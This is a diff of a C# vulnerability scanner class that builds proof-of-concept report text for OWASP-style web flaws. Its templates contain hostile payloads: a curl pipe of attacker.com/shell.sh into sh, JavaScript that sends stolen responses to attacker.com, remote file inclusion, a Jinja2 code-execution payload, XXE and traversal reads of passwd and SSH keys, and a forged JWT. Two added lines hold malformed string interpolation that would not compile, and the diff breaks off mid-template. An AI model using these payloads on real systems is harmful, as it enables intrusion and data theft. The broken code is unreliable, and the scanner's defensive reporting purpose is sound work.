@@ -1,775 +1,494 @@
 using System;
+using System.Text;
 
 namespace WebTrafficInspector.Services
 {
     /// <summary>
-    /// Enhanced PoC generators for all new vulnerability types
+    /// Enhanced Proof of Concept generators for OWASP vulnerabilities
     /// </summary>
     public partial class OWASPT10_2025_ScannerService
     {
-        #region Enhanced PoC Generators
+        #region SQL Injection PoCs
 
-        private string GenerateIDORPoCAdvanced(string url, string param, string originalValue, string testValue)
+        private string GenerateSQLInjectionPoC(string url, string payload, string method)
         {
-            return $@"Insecure Direct Object Reference (IDOR) PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== SQL Injection Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Method: {method}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Example Exploitation:");
+            sb.AppendLine();
 
-Target URL: {url}
-Vulnerable Parameter: {param}
-Original Value: {originalValue}
-Exploited Value: {testValue}
+            if (method == "GET")
+            {
+                sb.AppendLine($"curl '{url}?id={Uri.EscapeDataString(payload)}'");
+            }
+            else
+            {
+                sb.AppendLine($"curl -X POST '{url}' \\");
+                sb.AppendLine("  -H 'Content-Type: application/json' \\");
+                sb.AppendLine($"  -d '{{\"id\":\"{payload\"}}'");
+            }
 
-Attack Steps:
+            sb.AppendLine();
+            sb.AppendLine("Impact: Authentication bypass, data exfiltration, database manipulation");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Use parameterized queries/prepared statements");
+            sb.AppendLine("- Input validation and sanitization");
+            sb.AppendLine("- Principle of least privilege for database accounts");
+            sb.AppendLine("- Use ORM frameworks with proper escaping");
 
-1. Normal Request (User's Own Resource):
-   {ReplaceParameter(url, param, originalValue)}
-
-2. Malicious Request (Other User's Resource):
-   {ReplaceParameter(url, param, testValue)}
-
-3. Automated Enumeration Script (Python):
-```python
-import requests
-
-base_url = ""{url.Split('?')[0]}""
-for i in range(1, 1000):
-    test_url = f""{{base_url}}?{param}={{i}}""
-    response = requests.get(test_url)
-    if response.status_code == 200:
-        print(f""Accessible resource: {param}={{i}}"")
-        # Extract and save sensitive data
-```
-
-4. Mass Data Extraction:
-   - Enumerate all IDs: 1-9999
-   - Extract user profiles, documents, orders, etc.
-   - Build complete database dump
-
-Impact:
-   - Unauthorized access to other users' data
-   - Privacy violation (GDPR/CCPA)
-   - Data aggregation for identity theft
-   - Competitive intelligence theft
-
-Remediation:
-   - Implement proper authorization checks
-   - Use random, non-sequential identifiers (UUIDs)
-   - Validate user ownership before serving resources
-   - Log and monitor access patterns
-   - Implement rate limiting";
+            return sb.ToString();
         }
 
-        private string GeneratePathTraversalPoC(string url, string param, string payload)
+        #endregion
+
+        #region NoSQL Injection PoCs
+
+        private string GenerateNoSQLInjectionPoC(string url, string payload)
         {
-            return $@"Path Traversal PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== NoSQL Injection Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("MongoDB Injection Examples:");
+            sb.AppendLine();
+            sb.AppendLine("Authentication bypass:");
+            sb.AppendLine("POST /login HTTP/1.1");
+            sb.AppendLine("Content-Type: application/json");
+            sb.AppendLine();
+            sb.AppendLine("{");
+            sb.AppendLine("  \"username\": {\"$ne\": null},");
+            sb.AppendLine("  \"password\": {\"$ne\": null}");
+            sb.AppendLine("}");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Authentication bypass, unauthorized access, data extraction");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Input validation and type checking");
+            sb.AppendLine("- Use MongoDB query operators carefully");
+            sb.AppendLine("- Implement proper authentication");
+            sb.AppendLine("- Sanitize user input before query construction");
 
-Target URL: {url}
-Vulnerable Parameter: {param}
-Payload: {payload}
-
-Exploitation Steps:
-
-1. Basic File Disclosure:
-   {ReplaceParameter(url, param, "../../../../etc/passwd")}
-   Windows: {ReplaceParameter(url, param, "..\\..\\..\\..\\windows\\win.ini")}
-
-2. Application Configuration Files:
-   {ReplaceParameter(url, param, "../../../../etc/nginx/nginx.conf")}
-   {ReplaceParameter(url, param, "../../../../var/www/html/config.php")}
-   {ReplaceParameter(url, param, "../../../../.env")}
-
-3. Log Files:
-   {ReplaceParameter(url, param, "../../../../var/log/apache2/access.log")}
-   {ReplaceParameter(url, param, "../../../../var/log/nginx/error.log")}
-
-4. Database Credentials:
-   {ReplaceParameter(url, param, "../../../../etc/mysql/my.cnf")}
-   {ReplaceParameter(url, param, "../../../../var/www/html/wp-config.php")}
-
-5. SSH Keys:
-   {ReplaceParameter(url, param, "../../../../root/.ssh/id_rsa")}
-   {ReplaceParameter(url, param, "../../../../home/user/.ssh/authorized_keys")}
-
-6. Advanced Bypass Techniques:
-   - Null byte: {payload}%00.jpg
-   - Double encoding: %252e%252e%252f
-   - URL encoding: %2e%2e%2f
-   - Unicode: ..%c0%af
-
-Impact:
-   - Source code disclosure
-   - Credentials exposure
-   - System takeover via SSH keys
-   - Database compromise
-
-Remediation:
-   - Never use user input in file paths
-   - Use whitelist of allowed files
-   - Implement chroot jail
-   - Validate and sanitize all path inputs
-   - Use basename() to strip directory components";
+            return sb.ToString();
         }
 
-        private string GenerateOpenRedirectPoC(string url, string param, string payload)
+        #endregion
+
+        #region XSS PoCs
+
+        private string GenerateXSSPoC(string url, string payload, string type)
         {
-            return $@"Open Redirect PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine($"=== {type.ToUpper()} XSS Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine($"Type: {type}");
+            sb.AppendLine();
 
-Target URL: {url}
-Vulnerable Parameter: {param}
-Malicious Redirect: {payload}
+            if (type == "reflected")
+            {
+                sb.AppendLine("Exploitation URL:");
+                sb.AppendLine($"{url}?search={Uri.EscapeDataString(payload)}");
+                sb.AppendLine();
+                sb.AppendLine("Example attack scenario:");
+                sb.AppendLine("1. Attacker crafts malicious URL");
+                sb.AppendLine("2. Victim clicks on the link");
+                sb.AppendLine("3. Malicious script executes in victim's browser");
+                sb.AppendLine("4. Attacker steals session cookies or credentials");
+            }
+            else
+            {
+                sb.AppendLine("Exploitation steps:");
+                sb.AppendLine("1. Submit malicious payload to the application");
+                sb.AppendLine("2. Payload is stored in database");
+                sb.AppendLine("3. Every user viewing the page executes the malicious script");
+                sb.AppendLine();
+                sb.AppendLine("Example POST request:");
+                sb.AppendLine($"curl -X POST '{url}' \\");
+                sb.AppendLine("  -H 'Content-Type: application/json' \\");
+                sb.AppendLine($"  -d '{{\"comment\":\"{payload\"}}'");
+            }
 
-Phishing Attack Scenario:
+            sb.AppendLine();
+            sb.AppendLine("Impact: Session hijacking, credential theft, defacement, malware distribution");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Output encoding/escaping for all user input");
+            sb.AppendLine("- Content Security Policy (CSP) headers");
+            sb.AppendLine("- HTTPOnly and Secure flags on cookies");
+            sb.AppendLine("- Input validation");
 
-1. Attacker crafts link:
-   {ReplaceParameter(url, param, "http://evil.com")}
-
-2. Victim receives email:
-   ""Dear user, verify your account: {ReplaceParameter(url, param, "http://evil-paypal.com/login")}""
-
-3. Trust Exploitation:
-   - Link shows legitimate domain
-   - Redirects to phishing site
-   - Victim enters credentials
-
-Advanced Exploitation:
-
-1. OAuth/OIDC Attacks:
-   Manipulate redirect_uri to steal authorization codes
-
-2. XSS via Open Redirect:
-   {ReplaceParameter(url, param, "javascript:alert(document.cookie)")}
-
-3. SSRF Chain:
-   {ReplaceParameter(url, param, "http://169.254.169.254/latest/meta-data/")}
-
-Impact:
-   - Credential theft via phishing
-   - OAuth token stealing
-   - Session hijacking
-   - Malware distribution
-
-Remediation:
-   - Whitelist allowed redirect destinations
-   - Validate redirect URLs server-side
-   - Use relative URLs only
-   - Implement user confirmation for external redirects";
+            return sb.ToString();
         }
 
-        private string GenerateMissingFunctionLevelAccessControlPoC(string url, string adminPath)
+        #endregion
+
+        #region Command Injection PoCs
+
+        private string GenerateCommandInjectionPoC(string url, string payload)
         {
-            return $@"Missing Function Level Access Control PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== Command Injection Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Exploitation URL:");
+            sb.AppendLine($"{url}?cmd={Uri.EscapeDataString(payload)}");
+            sb.AppendLine();
+            sb.AppendLine("Example malicious commands:");
+            sb.AppendLine("- ; cat /etc/passwd");
+            sb.AppendLine("- | whoami");
+            sb.AppendLine("- && curl http://attacker.com/shell.sh | sh");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Remote code execution, system compromise, data theft");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Avoid using system commands with user input");
+            sb.AppendLine("- Use safe APIs instead of shell commands");
+            sb.AppendLine("- Input validation with whitelist approach");
+            sb.AppendLine("- Run application with minimal privileges");
 
-Target URL: {url}
-Accessible Path: {adminPath}
-
-Unauthorized Access:
-
-1. Direct Access (No Authentication):
-   GET {url}
-   Response: 200 OK (Should be 401/403)
-
-2. Common Administrative Paths:
-   /admin
-   /administrator
-   /manage
-   /dashboard
-   /api/admin
-   /api/users
-   /wp-admin
-
-3. API Enumeration:
-   /api/users - List all users
-   /api/users/1 - Get user details
-   /api/users/1/delete - Delete user
-   /api/config - View configuration
-
-4. Hidden Endpoints:
-   /.git/config
-   /.env
-   /backup.sql
-   /config.php
-
-Impact:
-   - Administrative access without authentication
-   - User data exposure
-   - Data modification/deletion
-   - System configuration changes
-
-Remediation:
-   - Implement authentication on all admin endpoints
-   - Use role-based access control (RBAC)
-   - Default deny approach
-   - Regular security audits
-   - Remove unused endpoints";
+            return sb.ToString();
         }
 
-        private string GenerateMissingSecurityHeaderPoC(string url, string header, string description)
+        #endregion
+
+        #region LDAP Injection PoCs
+
+        private string GenerateLDAPInjectionPoC(string url, string payload)
         {
-            return $@"Missing Security Header PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== LDAP Injection Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("LDAP Filter Injection:");
+            sb.AppendLine();
+            sb.AppendLine("Normal query:");
+            sb.AppendLine("(&(uid=username)(password=userpass))");
+            sb.AppendLine();
+            sb.AppendLine("Injected query:");
+            sb.AppendLine("(&(uid=admin*)(password=*))");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Authentication bypass, information disclosure");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Use parameterized LDAP queries");
+            sb.AppendLine("- Input validation and sanitization");
+            sb.AppendLine("- Escape special LDAP characters");
+            sb.AppendLine("- Implement proper access controls");
 
-Target URL: {url}
-Missing Header: {header}
-Risk: {description}
-
-Recommended Header Configuration:
-
-Strict-Transport-Security:
-   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-
-X-Frame-Options:
-   X-Frame-Options: DENY
-   Or: X-Frame-Options: SAMEORIGIN
-
-X-Content-Type-Options:
-   X-Content-Type-Options: nosniff
-
-Content-Security-Policy:
-   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
-
-X-XSS-Protection:
-   X-XSS-Protection: 1; mode=block
-
-Referrer-Policy:
-   Referrer-Policy: strict-origin-when-cross-origin
-
-Permissions-Policy:
-   Permissions-Policy: geolocation=(), microphone=(), camera=()
-
-Implementation Examples:
-
-Apache (.htaccess):
-   Header always set {header} ""[value]""
-
-Nginx:
-   add_header {header} ""[value]"" always;
-
-Node.js (Express):
-   app.use((req, res, next) => {{
-       res.setHeader('{header}', '[value]');
-       next();
-   }});
-
-Impact:
-   - Increased vulnerability to attacks
-   - No defense-in-depth protection
-   - Browser security features disabled
-
-Remediation:
-   - Implement all recommended security headers
-   - Test with securityheaders.com
-   - Use helmet.js for Node.js apps
-   - Regular header audits";
+            return sb.ToString();
         }
 
-        private string GenerateInsecureHeaderPoC(string url, string header, string value)
+        #endregion
+
+        #region XXE PoCs
+
+        private string GenerateXXEPoC(string url, string payload)
         {
-            return $@"Insecure Header Configuration PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== XXE (XML External Entity) Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine();
+            sb.AppendLine("Malicious XML Payload:");
+            sb.AppendLine();
+            sb.AppendLine("<?xml version=\"1.0\"?>");
+            sb.AppendLine("<!DOCTYPE foo [");
+            sb.AppendLine("  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">");
+            sb.AppendLine("]>");
+            sb.AppendLine("<foo>&xxe;</foo>");
+            sb.AppendLine();
+            sb.AppendLine("Example with curl:");
+            sb.AppendLine($"curl -X POST '{url}' \\");
+            sb.AppendLine("  -H 'Content-Type: application/xml' \\");
+            sb.AppendLine("  -d @malicious.xml");
+            sb.AppendLine();
+            sb.AppendLine("Impact: File disclosure, SSRF, denial of service");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Disable external entity processing in XML parser");
+            sb.AppendLine("- Use less complex data formats like JSON");
+            sb.AppendLine("- Update XML parser libraries");
+            sb.AppendLine("- Input validation");
 
-Target URL: {url}
-Header: {header}
-Current Value: {value}
-
-Security Risk:
-   The current header value weakens security protections
-
-Recommended Fix:
-
-{header}:
-   Current (Insecure): {value}
-   Recommended (Secure): [Secure configuration]
-
-Impact and Remediation in previous PoC...";
+            return sb.ToString();
         }
 
-        private string GenerateServerDisclosurePoC(string url, string serverInfo)
+        #endregion
+
+        #region SSRF PoCs
+
+        private string GenerateSSRFPoC(string url, string payload)
         {
-            return $@"Server Information Disclosure PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== SSRF (Server-Side Request Forgery) Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"SSRF Target: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Exploitation URL:");
+            sb.AppendLine($"{url}?url={Uri.EscapeDataString(payload)}");
+            sb.AppendLine();
+            sb.AppendLine("Cloud Metadata Exploitation:");
+            sb.AppendLine();
+            sb.AppendLine("AWS:");
+            sb.AppendLine($"{url}?url=http://169.254.169.254/latest/meta-data/");
+            sb.AppendLine();
+            sb.AppendLine("Google Cloud:");
+            sb.AppendLine($"{url}?url=http://metadata.google.internal/computeMetadata/v1/");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Access to internal systems, cloud credentials theft, port scanning");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Whitelist allowed URLs/domains");
+            sb.AppendLine("- Disable unused URL schemas (file://, gopher://, etc.)");
+            sb.AppendLine("- Network segmentation");
+            sb.AppendLine("- Validate and sanitize user input");
 
-Target URL: {url}
-Disclosed Information: {serverInfo}
-
-Attacker Intelligence Gathering:
-
-1. Version-Specific Exploits:
-   Server: {serverInfo}
-   → Search exploit-db for: {serverInfo}
-
-2. Technology Stack Fingerprinting:
-   → Identify vulnerable components
-   → Find known CVEs
-   → Automate exploitation
-
-Impact:
-   - Targeted attacks based on version
-   - Automated vulnerability scanning
-   - Reduced attack complexity
-
-Remediation:
-   - Remove/obscure Server header
-   - Use generic values
-   - Keep software updated";
+            return sb.ToString();
         }
 
-        private string GenerateTechDisclosurePoC(string url, string technology)
+        #endregion
+
+        #region SSTI PoCs
+
+        private string GenerateSSTIPoC(string url, string payload)
         {
-            return $@"Technology Stack Disclosure PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== SSTI (Server-Side Template Injection) Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Template Engine Detection:");
+            sb.AppendLine();
+            sb.AppendLine("Jinja2 (Python): {{7*7}} -> 49");
+            sb.AppendLine("Freemarker (Java): ${7*7} -> 49");
+            sb.AppendLine("ERB (Ruby): <%= 7*7 %> -> 49");
+            sb.AppendLine();
+            sb.AppendLine("Example RCE payload (Jinja2):");
+            sb.AppendLine("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Remote code execution, server compromise");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Use logic-less template engines");
+            sb.AppendLine("- Sandbox template environment");
+            sb.AppendLine("- Never pass user input directly to templates");
+            sb.AppendLine("- Input validation and sanitization");
 
-Target URL: {url}
-X-Powered-By: {technology}
-
-Impact:
-   Reveals backend technology, enabling targeted attacks
-
-Remediation:
-   - Remove X-Powered-By header
-   - Obscure technology stack
-   - Use security-focused configurations";
+            return sb.ToString();
         }
 
-        private string GenerateCORSMisconfigurationPoC(string url, string origin, string allowOrigin)
+        #endregion
+
+        #region Path Traversal PoCs
+
+        private string GeneratePathTraversalPoC(string url, string payload)
         {
-            return $@"CORS Misconfiguration PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== Path Traversal Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Exploitation URL:");
+            sb.AppendLine($"{url}?file={Uri.EscapeDataString(payload)}");
+            sb.AppendLine();
+            sb.AppendLine("Common targets:");
+            sb.AppendLine("Linux: ../../../../etc/passwd");
+            sb.AppendLine("Windows: ..\\..\\..\\..\\windows\\system32\\config\\sam");
+            sb.AppendLine();
+            sb.AppendLine("URL encoded payloads:");
+            sb.AppendLine("%2e%2e%2f (../)");
+            sb.AppendLine("%2e%2e%5c (..\\)");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Unauthorized file access, information disclosure");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Use whitelist of allowed files");
+            sb.AppendLine("- Validate and sanitize file paths");
+            sb.AppendLine("- Use secure file access APIs");
+            sb.AppendLine("- Implement proper access controls");
 
-Target URL: {url}
-Tested Origin: {origin}
-Allowed Origin: {allowOrigin}
-
-Exploitation:
-
-1. Malicious Website (http://evil.com/steal.html):
-```html
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-fetch('{url}', {{
-    method: 'GET',
-    credentials: 'include'
-}})
-.then(response => response.json())
-.then(data => {{
-    // Send stolen data to attacker
-    fetch('http://attacker.com/collect', {{
-        method: 'POST',
-        body: JSON.stringify(data)
-    }});
-}});
-</script>
-</body>
-</html>
-```
-
-2. Attack Scenario:
-   - Victim visits evil.com
-   - JavaScript makes authenticated request to {url}
-   - Response includes sensitive data
-   - Data is exfiltrated to attacker
-
-Impact:
-   - Sensitive data theft
-   - Session hijacking
-   - Account takeover
-
-Remediation:
-   - Never use wildcard (*) with credentials
-   - Whitelist specific origins
-   - Validate Origin header
-   - Don't reflect Origin header";
+            return sb.ToString();
         }
 
-        private string GenerateClickjackingPoC(string url)
+        #endregion
+
+        #region File Inclusion PoCs
+
+        private string GenerateFileInclusionPoC(string url, string payload)
         {
-            return $@"Clickjacking Vulnerability PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== File Inclusion Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Local File Inclusion (LFI):");
+            sb.AppendLine($"{url}?page=../../../../etc/passwd");
+            sb.AppendLine();
+            sb.AppendLine("PHP Wrappers:");
+            sb.AppendLine($"{url}?page=php://filter/convert.base64-encode/resource=config.php");
+            sb.AppendLine($"{url}?page=php://input (with POST data)");
+            sb.AppendLine();
+            sb.AppendLine("Remote File Inclusion (RFI):");
+            sb.AppendLine($"{url}?page=http://attacker.com/shell.txt");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Remote code execution, information disclosure");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Disable allow_url_include in PHP");
+            sb.AppendLine("- Use whitelist for file includes");
+            sb.AppendLine("- Validate and sanitize file paths");
+            sb.AppendLine("- Implement proper access controls");
 
-Target URL: {url}
-
-Attack Page (clickjack.html):
-```html
-<!DOCTYPE html>
-<html>
-<head>
-<style>
-#target_website {{
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    opacity: 0.00001;
-    z-index: 2;
-}}
-#decoy_website {{
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    z-index: 1;
-}}
-</style>
-</head>
-<body>
-<div id=""decoy_website"">
-    <h1>Click here to win $1000!</h1>
-    <button style=""position: absolute; top: 300px; left: 200px; padding: 50px;"">
-        CLICK ME!
-    </button>
-</div>
-<iframe id=""target_website"" src=""{url}""></iframe>
-</body>
-</html>
-```
-
-Attack Scenarios:
-
-1. Unauthorized Actions:
-   - User thinks they're clicking ""Win $1000""
-   - Actually clicking ""Delete Account"" on hidden iframe
-
-2. Like-Jacking:
-   - Trick users into liking malicious pages
-   - Spread malware/spam
-
-3. Drag & Drop Attacks:
-   - Trick users into dragging sensitive data
-   - Exfiltrate information
-
-Impact:
-   - Unauthorized state-changing actions
-   - Data theft via drag-and-drop
-   - Privacy violations
-
-Remediation:
-   - Set X-Frame-Options: DENY or SAMEORIGIN
-   - Use CSP frame-ancestors directive
-   - Implement frame-busting JavaScript (not reliable alone)";
+            return sb.ToString();
         }
 
-        private string GenerateHTTPSmugglingPoC(string url)
+        #endregion
+
+        #region CRLF Injection PoCs
+
+        private string GenerateCRLFInjectionPoC(string url, string payload)
         {
-            return $@"HTTP Request Smuggling PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== CRLF Injection Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Payload: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("HTTP Response Splitting:");
+            sb.AppendLine();
+            sb.AppendLine("Injected headers:");
+            sb.AppendLine("%0d%0aSet-Cookie: admin=true");
+            sb.AppendLine("%0d%0aLocation: http://attacker.com");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Session fixation, XSS, cache poisoning");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Validate and sanitize header values");
+            sb.AppendLine("- Remove CRLF characters from user input");
+            sb.AppendLine("- Use secure header APIs");
+            sb.AppendLine("- Implement proper input validation");
 
-Target URL: {url}
-
-CL.TE Smuggling Attack:
-```
-POST {url} HTTP/1.1
-Host: target.com
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-G
-```
-
-TE.CL Smuggling Attack:
-```
-POST {url} HTTP/1.1
-Host: target.com
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5c
-POST /admin HTTP/1.1
-Host: target.com
-Content-Length: 15
-
-x=1
-0
-
-```
-
-Attack Scenarios:
-
-1. Bypassing Security Controls:
-   - Smuggle requests past WAF
-   - Access admin endpoints
-
-2. Cache Poisoning:
-   - Inject malicious responses
-   - Affect multiple users
-
-3. Request Hijacking:
-   - Steal other users' requests
-   - Capture credentials
-
-Impact:
-   - Authentication bypass
-   - Cache poisoning
-   - Request hijacking
-   - XSS and other injection attacks
-
-Remediation:
-   - Use HTTP/2 (if possible)
-   - Normalize requests
-   - Disable support for both CL and TE
-   - Strict request parsing";
+            return sb.ToString();
         }
 
-        private string GenerateVerboseErrorPoC(string url, string errorType)
+        #endregion
+
+        #region Open Redirect PoCs
+
+        private string GenerateOpenRedirectPoC(string url, string payload)
         {
-            return $@"Verbose Error Messages PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== Open Redirect Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Redirect Target: {payload}");
+            sb.AppendLine();
+            sb.AppendLine("Exploitation URL:");
+            sb.AppendLine($"{url}?redirect={Uri.EscapeDataString(payload)}");
+            sb.AppendLine();
+            sb.AppendLine("Example malicious URLs:");
+            sb.AppendLine($"{url}?next=http://evil.com");
+            sb.AppendLine($"{url}?url=//evil.com");
+            sb.AppendLine($"{url}?redirect=javascript:alert(1)");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Phishing, credential theft, malware distribution");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Whitelist allowed redirect URLs");
+            sb.AppendLine("- Validate redirect destinations");
+            sb.AppendLine("- Use relative URLs for redirects");
+            sb.AppendLine("- Warn users about external redirects");
 
-Target URL: {url}
-Error Type: {errorType}
-
-Information Disclosed:
-   - Stack traces
-   - File paths
-   - Database schema
-   - Framework versions
-   - Internal IP addresses
-
-Attack Intelligence:
-
-1. Technology Stack:
-   → Identify exact versions
-   → Find CVEs
-
-2. File Structure:
-   → Map application architecture
-   → Locate sensitive files
-
-3. Database Schema:
-   → Extract table/column names
-   → Build SQL injection attacks
-
-Impact:
-   - Reduced attack complexity
-   - Targeted exploitation
-   - Faster reconnaissance
-
-Remediation:
-   - Use generic error pages
-   - Log detailed errors server-side only
-   - Disable debug mode in production
-   - Custom error handlers";
+            return sb.ToString();
         }
 
-        private string GenerateJWTNoneAlgorithmPoC(string url)
+        #endregion
+
+        #region IDOR PoCs
+
+        private string GenerateIDORPoC(string url, string testValue, string originalId)
         {
-            return $@"JWT None Algorithm Attack PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== IDOR (Insecure Direct Object Reference) Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Original ID: {originalId}");
+            sb.AppendLine($"Test ID: {testValue}");
+            sb.AppendLine();
+            sb.AppendLine("Testing horizontal privilege escalation:");
+            sb.AppendLine($"GET {url}/{testValue}");
+            sb.AppendLine();
+            sb.AppendLine("Testing vertical privilege escalation:");
+            sb.AppendLine($"GET {url}/admin");
+            sb.AppendLine($"GET {url}/1 (admin user)");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Unauthorized access to other users' data");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Implement proper authorization checks");
+            sb.AppendLine("- Use indirect references (UUIDs)");
+            sb.AppendLine("- Verify user permissions on every request");
+            sb.AppendLine("- Use session-based access controls");
 
-Target URL: {url}
-
-Attack Steps:
-
-1. Capture Valid JWT:
-   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-
-2. Decode JWT:
-   Header: {""alg"":""HS256"",""typ"":""JWT""}
-   Payload: {""sub"":""user"",""iat"":1516239022}
-
-3. Modify to None Algorithm:
-   Header: {""alg"":""none"",""typ"":""JWT""}
-   Payload: {""sub"":""admin"",""iat"":1516239022}
-
-4. Create Malicious JWT (without signature):
-   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
-
-5. Send Request:
-   GET {url}
-   Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
-
-Other JWT Attacks:
-
-1. Algorithm Confusion (RS256 → HS256)
-2. Weak Secret Bruteforce
-3. KID Header Injection
-4. JKU/X5U URL Injection
-
-Impact:
-   - Authentication bypass
-   - Privilege escalation
-   - Account takeover
-
-Remediation:
-   - Explicitly verify algorithm
-   - Use strong secrets (256+ bits)
-   - Validate all JWT claims
-   - Implement proper key management";
+            return sb.ToString();
         }
 
-        private string GenerateJWTWeakSecretPoC(string url)
+        #endregion
+
+        #region CORS PoCs
+
+        private string GenerateCORSPoC(string url, string testOrigin, string vulnerableOrigin)
         {
-            return $@"JWT Weak Secret PoC:
+            var sb = new StringBuilder();
+            sb.AppendLine("=== CORS Misconfiguration Proof of Concept ===");
+            sb.AppendLine();
+            sb.AppendLine($"Target URL: {url}");
+            sb.AppendLine($"Vulnerable Origin: {vulnerableOrigin}");
+            sb.AppendLine();
+            sb.AppendLine("Malicious HTML page:");
+            sb.AppendLine();
+            sb.AppendLine("<!DOCTYPE html>");
+            sb.AppendLine("<html>");
+            sb.AppendLine("<body>");
+            sb.AppendLine("<script>");
+            sb.AppendLine($"  fetch('{url}', {{");
+            sb.AppendLine("    credentials: 'include'");
+            sb.AppendLine("  })");
+            sb.AppendLine("  .then(r => r.text())");
+            sb.AppendLine("  .then(data => {");
+            sb.AppendLine("    // Send stolen data to attacker");
+            sb.AppendLine("    fetch('http://attacker.com/log?data=' + encodeURIComponent(data));");
+            sb.AppendLine("  });");
+            sb.AppendLine("</script>");
+            sb.AppendLine("</body>");
+            sb.AppendLine("</html>");
+            sb.AppendLine();
+            sb.AppendLine("Impact: Data theft, session hijacking");
+            sb.AppendLine();
+            sb.AppendLine("Remediation:");
+            sb.AppendLine("- Whitelist specific trusted origins");
+            sb.AppendLine("- Avoid using Access-Control-Allow-Origin: *");
+            sb.AppendLine("- Never reflect arbitrary Origin headers");
+            sb.AppendLine("- Implement proper authentication");
 
-Target URL: {url}
-
-Brute Force Attack:
-
-1. Capture JWT:
-   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE
-
